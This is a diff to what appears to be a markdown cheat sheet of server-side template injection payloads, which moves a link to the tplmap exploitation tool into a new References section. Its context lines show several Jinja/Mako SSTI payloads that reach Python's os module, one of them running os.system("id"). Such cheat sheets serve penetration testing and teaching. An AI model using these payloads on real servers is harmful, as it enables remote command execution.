@@ -1,9 +1,5 @@
 # Server Side Template Injection (SSTI)
 
-{% embed url="https://github.com/epinna/tplmap" %}
-tplmap - Server-Side Template Injection and Code Injection Detection and Exploitation Tool
-{% endembed %}
-
 ### Payloads
 
 ```python
@@ -115,3 +111,9 @@ ${self.template.module.runtime.exceptions.traceback.linecache.os.system("id")}
 {{joiner.__init__.__globals__.os}}
 {{namespace.__init__.__globals__.os}}
 ```
+
+### References
+
+{% embed url="https://github.com/epinna/tplmap" %}
+tplmap - Server-Side Template Injection and Code Injection Detection and Exploitation Tool
+{% endembed %}
